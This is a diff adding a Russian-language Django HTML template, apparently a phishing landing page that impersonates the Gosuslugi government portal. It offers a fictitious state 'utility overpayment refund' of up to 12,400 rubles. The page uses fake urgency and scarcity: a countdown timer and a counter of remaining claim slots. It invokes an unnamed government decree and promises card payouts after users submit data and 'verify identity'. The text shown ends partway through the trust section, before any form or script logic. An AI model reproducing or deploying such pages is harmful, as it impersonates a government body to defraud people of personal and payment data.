@@ -1,0 +1,1443 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+    <meta content="no-cache" http-equiv="Cache-control">
+    <meta content="no-cache" http-equiv="Pragma">
+    <meta content="-1" http-equiv="Expires">
+    <title>Возврат переплаты за ЖКХ — Государственная программа компенсации</title>
+    <meta property="og:title" content="Возврат средств за переплату ЖКХ — до 12 400 ₽"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:description" content="Государственная программа компенсации переплат за коммунальные услуги. Проверьте, положен ли вам возврат, и получите средства на карту."/>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{% static 'css/style.css' %}">
+    <style>
+        :root {
+            --primary: #1e40af;
+            --primary-light: #3b82f6;
+            --primary-lighter: #60a5fa;
+            --accent: #059669;
+            --accent-light: #10b981;
+            --surface: #ffffff;
+            --surface-warm: #f0f9ff;
+            --bg-gradient: linear-gradient(180deg, #eff6ff 0%, #ffffff 50%, #f0f9ff 100%);
+            --primary-gradient: linear-gradient(135deg, #1e40af 0%, #3b82f6 50%, #60a5fa 100%);
+            --accent-gradient: linear-gradient(135deg, #059669 0%, #10b981 100%);
+            --text-primary: #1e293b;
+            --text-secondary: #64748b;
+            --text-muted: #94a3b8;
+            --border-color: #dbeafe;
+            --radius-sm: 12px;
+            --radius-md: 16px;
+            --radius-lg: 24px;
+            --radius-xl: 32px;
+            --shadow-main: 0 20px 60px rgba(30, 64, 175, 0.15);
+            --shadow-soft: 0 8px 30px rgba(30, 64, 175, 0.08);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-gradient);
+            min-height: 100vh;
+            color: var(--text-primary);
+            -webkit-font-smoothing: antialiased;
+            overflow-x: hidden;
+        }
+
+        /* Floating Icons Background */
+        .icons-bg {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .floating-icon {
+            position: absolute;
+            font-size: 24px;
+            opacity: 0.12;
+            animation: floatIcon 18s ease-in-out infinite;
+        }
+
+        .floating-icon:nth-child(1) { left: 5%; top: 10%; animation-delay: 0s; font-size: 30px; }
+        .floating-icon:nth-child(2) { left: 15%; top: 60%; animation-delay: -2s; font-size: 22px; }
+        .floating-icon:nth-child(3) { left: 30%; top: 25%; animation-delay: -4s; font-size: 28px; }
+        .floating-icon:nth-child(4) { left: 50%; top: 75%; animation-delay: -7s; font-size: 20px; }
+        .floating-icon:nth-child(5) { left: 70%; top: 15%; animation-delay: -9s; font-size: 34px; }
+        .floating-icon:nth-child(6) { left: 80%; top: 65%; animation-delay: -11s; font-size: 24px; }
+        .floating-icon:nth-child(7) { left: 90%; top: 35%; animation-delay: -13s; font-size: 26px; }
+        .floating-icon:nth-child(8) { left: 40%; top: 90%; animation-delay: -15s; font-size: 28px; }
+
+        @keyframes floatIcon {
+            0%, 100% { transform: translateY(0) rotate(0deg) scale(1); }
+            25% { transform: translateY(-15px) rotate(5deg) scale(1.05); }
+            50% { transform: translateY(-8px) rotate(-3deg) scale(0.97); }
+            75% { transform: translateY(-20px) rotate(3deg) scale(1.02); }
+        }
+
+        /* Decorative blobs */
+        .deco-blob {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.3;
+            z-index: 0;
+        }
+
+        .deco-blob-1 {
+            width: 400px;
+            height: 400px;
+            background: linear-gradient(135deg, #bfdbfe, #93c5fd);
+            top: -150px;
+            right: -100px;
+            animation: blobMove 20s ease-in-out infinite;
+        }
+
+        .deco-blob-2 {
+            width: 300px;
+            height: 300px;
+            background: linear-gradient(135deg, #a7f3d0, #6ee7b7);
+            bottom: -100px;
+            left: -100px;
+            animation: blobMove 25s ease-in-out infinite reverse;
+        }
+
+        @keyframes blobMove {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, 20px) scale(1.1); }
+        }
+
+        /* Container */
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 540px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        .page-header {
+            padding: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .brand-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .brand-logo {
+            height: 28px;
+            object-fit: contain;
+        }
+
+        .brand-tag {
+            background: var(--primary-gradient);
+            color: white;
+            font-size: 11px;
+            font-weight: 800;
+            padding: 8px 14px;
+            border-radius: 20px;
+            letter-spacing: 0.3px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 4px 15px rgba(30, 64, 175, 0.3);
+        }
+
+        /* Hero */
+        .hero-section {
+            padding: 24px 0 36px;
+            text-align: center;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--surface);
+            border: 2px solid var(--border-color);
+            padding: 12px 20px;
+            border-radius: 30px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow-soft);
+            animation: fadeInScale 0.5s ease-out;
+        }
+
+        .badge-icons {
+            display: flex;
+            gap: 2px;
+        }
+
+        .badge-icon {
+            font-size: 16px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .badge-icon:nth-child(2) { animation-delay: 0.3s; }
+        .badge-icon:nth-child(3) { animation-delay: 0.6s; }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.15); }
+        }
+
+        .badge-text {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .hero-title {
+            font-size: clamp(26px, 7vw, 38px);
+            font-weight: 900;
+            line-height: 1.2;
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+            animation: fadeInUp 0.6s ease-out 0.1s backwards;
+        }
+
+        .hero-title .accent-text {
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-title .green-text {
+            color: var(--accent);
+        }
+
+        .hero-desc {
+            font-size: 16px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            max-width: 420px;
+            margin: 0 auto;
+            animation: fadeInUp 0.6s ease-out 0.2s backwards;
+        }
+
+        .hero-desc .highlight {
+            color: var(--primary);
+            font-weight: 700;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Urgency Banner */
+        .urgency-banner {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            border-radius: var(--radius-lg);
+            padding: 20px;
+            text-align: center;
+            color: white;
+            margin-bottom: 24px;
+            box-shadow: 0 10px 30px rgba(30, 64, 175, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .urgency-banner::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 70%);
+            animation: pulseGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+
+        .urgency-text {
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .countdown-timer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .timer-unit {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .timer-label {
+            font-size: 10px;
+            font-weight: 600;
+            opacity: 0.9;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .timer-digits {
+            display: flex;
+            gap: 2px;
+        }
+
+        .timer-digit {
+            width: 36px;
+            height: 44px;
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 900;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .timer-digit.flip {
+            animation: flipDigit 0.5s ease-in-out;
+        }
+
+        @keyframes flipDigit {
+            0% { transform: rotateX(0deg); }
+            50% { transform: rotateX(90deg); }
+            100% { transform: rotateX(0deg); }
+        }
+
+        .timer-separator {
+            font-size: 20px;
+            font-weight: 800;
+            opacity: 0.7;
+            margin: 0 2px;
+            position: relative;
+            top: -8px;
+        }
+
+        .timer-expired {
+            font-size: 16px;
+            font-weight: 800;
+            padding: 12px 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+        }
+
+        /* Claims Counter */
+        .claims-counter {
+            background: linear-gradient(135deg, #fff 0%, var(--surface-warm) 100%);
+            border-radius: var(--radius-lg);
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            border: 2px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: var(--shadow-soft);
+        }
+
+        .claims-counter-label {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-secondary);
+        }
+
+        .claims-counter-value {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .claims-count {
+            font-size: 22px;
+            font-weight: 900;
+            color: var(--primary);
+        }
+
+        .claims-total {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .claims-progress {
+            width: 100%;
+            height: 6px;
+            background: var(--border-color);
+            border-radius: 3px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+
+        .claims-progress-bar {
+            height: 100%;
+            background: var(--primary-gradient);
+            border-radius: 3px;
+            transition: width 0.5s ease;
+        }
+
+        /* Offer Card */
+        .offer-card {
+            background: var(--surface);
+            border-radius: var(--radius-xl);
+            padding: 32px 24px;
+            margin-bottom: 24px;
+            box-shadow: var(--shadow-main);
+            border: 2px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 0.6s ease-out 0.3s backwards;
+        }
+
+        .offer-card::before {
+            content: '🏠';
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            font-size: 80px;
+            opacity: 0.06;
+            transform: rotate(15deg);
+        }
+
+        .offer-amount-block {
+            text-align: center;
+            padding-bottom: 24px;
+            border-bottom: 2px dashed var(--border-color);
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .offer-label {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .offer-value {
+            font-size: 68px;
+            font-weight: 900;
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1;
+            letter-spacing: -2px;
+        }
+
+        .offer-value span {
+            font-size: 32px;
+        }
+
+        .offer-caption {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-top: 10px;
+            font-weight: 600;
+        }
+
+        .offer-caption .emoji {
+            font-size: 18px;
+        }
+
+        /* Services Block */
+        .services-block {
+            background: linear-gradient(135deg, var(--surface-warm) 0%, #fff 100%);
+            border-radius: var(--radius-lg);
+            padding: 20px;
+            margin-bottom: 24px;
+            border: 1px solid var(--border-color);
+        }
+
+        .services-label {
+            font-size: 12px;
+            font-weight: 800;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 16px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .services-list {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+
+        .service-tile {
+            background: var(--surface);
+            border-radius: var(--radius-md);
+            padding: 16px 10px;
+            text-align: center;
+            border: 2px solid var(--border-color);
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .service-tile:hover {
+            transform: translateY(-6px);
+            box-shadow: var(--shadow-soft);
+            border-color: var(--primary-lighter);
+        }
+
+        .service-icon-wrap {
+            width: 50px;
+            height: 50px;
+            border-radius: var(--radius-md);
+            margin: 0 auto 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        .icon-water { background: linear-gradient(135deg, #0ea5e9, #38bdf8); }
+        .icon-heat { background: linear-gradient(135deg, #f97316, #fb923c); }
+        .icon-electric { background: linear-gradient(135deg, #eab308, #fbbf24); }
+
+        .service-name {
+            font-size: 12px;
+            font-weight: 800;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+            line-height: 1.3;
+        }
+
+        .service-refund {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--accent);
+        }
+
+        /* CTA */
+        .cta-wrap {
+            margin-bottom: 16px;
+        }
+
+        .cta-main {
+            width: 100%;
+            height: 58px;
+            background: var(--accent-gradient);
+            border: none;
+            border-radius: var(--radius-md);
+            color: white;
+            font-family: inherit;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .cta-main::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: cta-shine 2s ease-in-out infinite;
+        }
+
+        @keyframes cta-shine {
+            0% { left: -100%; }
+            50%, 100% { left: 100%; }
+        }
+
+        .cta-main:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(5, 150, 105, 0.4);
+        }
+
+        .cta-main:active {
+            transform: translateY(0);
+        }
+
+        .cta-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 12px;
+        }
+
+        .cta-note svg {
+            width: 14px;
+            height: 14px;
+            color: var(--accent);
+        }
+
+        /* Benefits */
+        .benefits-section {
+            padding: 16px 0 32px;
+        }
+
+        .benefits-title {
+            font-size: 18px;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 16px;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .benefits-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .benefit-item {
+            background: var(--surface);
+            border-radius: var(--radius-lg);
+            padding: 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            box-shadow: var(--shadow-soft);
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+            animation: fadeInUp 0.5s ease-out backwards;
+        }
+
+        .benefit-item:nth-child(1) { animation-delay: 0.4s; }
+        .benefit-item:nth-child(2) { animation-delay: 0.5s; }
+        .benefit-item:nth-child(3) { animation-delay: 0.6s; }
+
+        .benefit-item:hover {
+            transform: translateX(8px);
+            border-color: var(--primary-lighter);
+        }
+
+        .benefit-icon {
+            width: 46px;
+            height: 46px;
+            border-radius: var(--radius-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            flex-shrink: 0;
+        }
+
+        .benefit-icon.b1 { background: linear-gradient(135deg, #dbeafe, #bfdbfe); }
+        .benefit-icon.b2 { background: linear-gradient(135deg, #d1fae5, #a7f3d0); }
+        .benefit-icon.b3 { background: linear-gradient(135deg, #fef3c7, #fde68a); }
+
+        .benefit-content h4 {
+            font-size: 14px;
+            font-weight: 800;
+            margin-bottom: 3px;
+            color: var(--text-primary);
+        }
+
+        .benefit-content p {
+            font-size: 12px;
+            color: var(--text-secondary);
+            line-height: 1.4;
+        }
+
+        /* Steps */
+        .steps-section {
+            padding: 16px 0 32px;
+        }
+
+        .steps-title {
+            font-size: 20px;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .steps-list {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .step-item {
+            background: var(--surface);
+            border-radius: var(--radius-lg);
+            padding: 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            box-shadow: var(--shadow-soft);
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+        }
+
+        .step-item:hover {
+            transform: translateX(8px);
+            border-color: var(--primary-lighter);
+        }
+
+        .step-num {
+            width: 42px;
+            height: 42px;
+            background: var(--primary-gradient);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            font-weight: 900;
+            flex-shrink: 0;
+        }
+
+        .step-text h5 {
+            font-size: 14px;
+            font-weight: 800;
+            margin-bottom: 2px;
+        }
+
+        .step-text p {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        /* FAQ */
+        .faq-section {
+            padding: 24px 0;
+        }
+
+        .faq-title {
+            font-size: 20px;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .faq-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .faq-item {
+            background: var(--surface);
+            border-radius: var(--radius-md);
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .faq-item:hover {
+            border-color: var(--primary-lighter);
+        }
+
+        .faq-question {
+            width: 100%;
+            padding: 16px 20px;
+            background: none;
+            border: none;
+            text-align: left;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-primary);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+        }
+
+        .faq-question::after {
+            content: '+';
+            font-size: 20px;
+            font-weight: 300;
+            color: var(--primary);
+            transition: transform 0.3s ease;
+        }
+
+        .faq-item.active .faq-question::after {
+            transform: rotate(45deg);
+        }
+
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease, padding 0.3s ease;
+        }
+
+        .faq-item.active .faq-answer {
+            max-height: 200px;
+        }
+
+        .faq-answer-content {
+            padding: 0 20px 16px;
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        /* Trust */
+        .trust-bar {
+            padding: 24px 0;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+
+        .trust-item svg {
+            width: 14px;
+            height: 14px;
+            color: var(--accent);
+        }
+
+        /* Footer */
+        .page-footer {
+            padding: 20px 0;
+            text-align: center;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .page-footer p {
+            font-size: 10px;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        /* Scroll Animations */
+        .scroll-reveal {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.6s ease-out;
+        }
+
+        .scroll-reveal.revealed {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Loader */
+        .loader {
+            background: rgba(255, 255, 255, 0.97);
+            position: fixed;
+            inset: 0;
+            z-index: 999999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .loader.show {
+            display: flex;
+        }
+
+        .loader-icon {
+            font-size: 48px;
+            animation: loaderPulse 0.8s ease-in-out infinite;
+        }
+
+        @keyframes loaderPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.3); }
+        }
+
+        .loader-label {
+            margin-top: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        .loader-sublabel {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+
+        /* Flow container (form overlay) */
+        .vstep-box.advise__box {
+            position: fixed;
+            inset: 0;
+            z-index: 10000;
+            background: var(--surface);
+            overflow-y: auto;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 16px;
+            }
+
+            .brand-tag {
+                font-size: 10px;
+                padding: 6px 10px;
+            }
+
+            .hero-section {
+                padding: 16px 0 28px;
+            }
+
+            .offer-card {
+                padding: 24px 18px;
+            }
+
+            .offer-value {
+                font-size: 54px;
+            }
+
+            .offer-value span {
+                font-size: 26px;
+            }
+
+            .services-list {
+                gap: 8px;
+            }
+
+            .service-tile {
+                padding: 12px 6px;
+            }
+
+            .service-icon-wrap {
+                width: 42px;
+                height: 42px;
+                font-size: 20px;
+            }
+
+            .service-name {
+                font-size: 10px;
+            }
+
+            .floating-icon {
+                font-size: 18px;
+            }
+
+            .timer-digit {
+                width: 28px;
+                height: 36px;
+                font-size: 20px;
+            }
+
+            .timer-separator {
+                font-size: 16px;
+            }
+
+            .timer-label {
+                font-size: 9px;
+            }
+
+            .urgency-text {
+                font-size: 12px;
+            }
+        }
+    </style>
+    <script>
+        var SITE_ID = "zhkh_refund";
+    </script>
+    <script src="{% static 'js/core.min.js' %}"></script>
+</head>
+<body>
+    <!-- Floating Icons Background -->
+    <div class="icons-bg">
+        <div class="floating-icon">🏠</div>
+        <div class="floating-icon">💧</div>
+        <div class="floating-icon">🔥</div>
+        <div class="floating-icon">⚡</div>
+        <div class="floating-icon">💰</div>
+        <div class="floating-icon">🏢</div>
+        <div class="floating-icon">📋</div>
+        <div class="floating-icon">🏠</div>
+    </div>
+
+    <!-- Decorative Blobs -->
+    <div class="deco-blob deco-blob-1"></div>
+    <div class="deco-blob deco-blob-2"></div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="page-header">
+            <div class="brand-group">
+                <img src="{% static 'images/logo.png' %}" alt="Госуслуги" class="brand-logo">
+            </div>
+            <span class="brand-tag">🏠 Программа 2025</span>
+        </header>
+
+        <!-- Hero -->
+        <section class="hero-section">
+            <div class="hero-badge">
+                <div class="badge-icons">
+                    <span class="badge-icon">💧</span>
+                    <span class="badge-icon">🔥</span>
+                    <span class="badge-icon">⚡</span>
+                </div>
+                <span class="badge-text">Возврат за ЖКХ</span>
+            </div>
+            <h1 class="hero-title">
+                <span class="accent-text">Возврат</span> переплаты<br>
+                за <span class="accent-text">услуги ЖКХ</span> 🏠
+            </h1>
+            <p class="hero-desc">
+                Получите до <span class="highlight" id="tr_summ">12 400 ₽</span> компенсации за переплаченные коммунальные услуги по государственной программе
+            </p>
+        </section>
+
+        <!-- Urgency Banner -->
+        <div class="urgency-banner">
+            <div class="urgency-text">
+                ⏰ Приём заявок завершится через:
+            </div>
+            <div class="countdown-timer" id="countdownTimer">
+                <div class="timer-unit">
+                    <div class="timer-digits">
+                        <div class="timer-digit" id="days1">0</div>
+                        <div class="timer-digit" id="days2">0</div>
+                    </div>
+                    <div class="timer-label">Дней</div>
+                </div>
+                <div class="timer-separator">:</div>
+                <div class="timer-unit">
+                    <div class="timer-digits">
+                        <div class="timer-digit" id="hours1">0</div>
+                        <div class="timer-digit" id="hours2">0</div>
+                    </div>
+                    <div class="timer-label">Часов</div>
+                </div>
+                <div class="timer-separator">:</div>
+                <div class="timer-unit">
+                    <div class="timer-digits">
+                        <div class="timer-digit" id="minutes1">0</div>
+                        <div class="timer-digit" id="minutes2">0</div>
+                    </div>
+                    <div class="timer-label">Минут</div>
+                </div>
+                <div class="timer-separator">:</div>
+                <div class="timer-unit">
+                    <div class="timer-digits">
+                        <div class="timer-digit" id="seconds1">0</div>
+                        <div class="timer-digit" id="seconds2">0</div>
+                    </div>
+                    <div class="timer-label">Секунд</div>
+                </div>
+            </div>
+            <div class="timer-expired" id="timerExpired" style="display: none;">
+                Приём заявок завершён
+            </div>
+        </div>
+
+        <!-- Claims Counter -->
+        <div class="claims-counter scroll-reveal">
+            <div>
+                <div class="claims-counter-label">📋 Осталось мест для подачи заявки:</div>
+                <div class="claims-progress">
+                    <div class="claims-progress-bar" id="claimsProgressBar" style="width: 23%;"></div>
+                </div>
+            </div>
+            <div class="claims-counter-value">
+                <span class="claims-count" id="claimsCount">1 147</span>
+                <span class="claims-total">из 5 000</span>
+            </div>
+        </div>
+
+        <!-- Offer Card -->
+        <div class="offer-card scroll-reveal">
+            <div class="offer-amount-block">
+                <div class="offer-label">🏠 Ваша компенсация 🏠</div>
+                <div class="offer-value">12 400<span> ₽</span></div>
+                <div class="offer-caption">
+                    <span class="emoji">💰</span> возврат за переплату ЖКХ
+                </div>
+            </div>
+
+            <div class="services-block">
+                <div class="services-label">💧 Компенсация по услугам</div>
+                <div class="services-list">
+                    <div class="service-tile">
+                        <div class="service-icon-wrap icon-water">💧</div>
+                        <div class="service-name">Водо&shy;снабжение</div>
+                        <div class="service-refund">до 4 200 ₽</div>
+                    </div>
+                    <div class="service-tile">
+                        <div class="service-icon-wrap icon-heat">🔥</div>
+                        <div class="service-name">Отопление</div>
+                        <div class="service-refund">до 5 100 ₽</div>
+                    </div>
+                    <div class="service-tile">
+                        <div class="service-icon-wrap icon-electric">⚡</div>
+                        <div class="service-name">Электро&shy;энергия</div>
+                        <div class="service-refund">до 3 100 ₽</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="cta-wrap">
+                <button class="cta-main" onclick="startClaim();">
+                    📋 Подать заявку на возврат
+                </button>
+                <div class="cta-note">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    </svg>
+                    Защищённая передача данных
+                </div>
+            </div>
+        </div>
+
+        <!-- Benefits -->
+        <section class="benefits-section scroll-reveal">
+            <div class="benefits-title">✅ Почему стоит подать заявку</div>
+            <div class="benefits-grid">
+                <div class="benefit-item">
+                    <div class="benefit-icon b1">🏛️</div>
+                    <div class="benefit-content">
+                        <h4>Государственная программа</h4>
+                        <p>Официальная компенсация по постановлению Правительства РФ</p>
+                    </div>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon b2">⚡</div>
+                    <div class="benefit-content">
+                        <h4>Быстрое зачисление</h4>
+                        <p>Средства поступят на карту в течение 3 рабочих дней</p>
+                    </div>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon b3">💰</div>
+                    <div class="benefit-content">
+                        <h4>Возврат до 100%</h4>
+                        <p>Полная компенсация переплат за последние 12 месяцев</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Steps -->
+        <section class="steps-section scroll-reveal">
+            <h2 class="steps-title">📝 Как получить возврат?</h2>
+            <div class="steps-list">
+                <div class="step-item">
+                    <div class="step-num">1</div>
+                    <div class="step-text">
+                        <h5>Подайте заявку</h5>
+                        <p>Заполните форму с вашими данными</p>
+                    </div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">2</div>
+                    <div class="step-text">
+                        <h5>Подтвердите личность</h5>
+                        <p>Пройдите быструю верификацию</p>
+                    </div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">3</div>
+                    <div class="step-text">
+                        <h5>Получите средства 💰</h5>
+                        <p>Компенсация зачислится на вашу карту</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- FAQ -->
+        <section class="faq-section scroll-reveal">
+            <h2 class="faq-title">❓ Частые вопросы</h2>
+            <div class="faq-list">
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        Кто может получить возврат?
+                    </button>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            Все граждане РФ, оплачивающие коммунальные услуги. Программа распространяется на водоснабжение, отопление и электроэнергию. Возраст от 18 лет.
+                        </div>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        Как быстро придут деньги?
+                    </button>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            Средства зачисляются на карту в течение 1-3 рабочих дней после подтверждения заявки. Вы получите SMS-уведомление о зачислении.
+                        </div>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        Какие документы нужны?
+                    </button>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            Никаких документов не требуется. Достаточно заполнить заявку с вашими данными — система автоматически проверит начисления по базе ЖКХ.
+                        </div>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFaq(this)">
+                        Это безопасно?
+                    </button>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            Да! Данные передаются по защищённому каналу и обрабатываются в соответствии с ФЗ-152 «О персональных данных». Банковский уровень шифрования.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Trust -->
+        <div class="trust-bar scroll-reveal">
+            <div class="trust-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
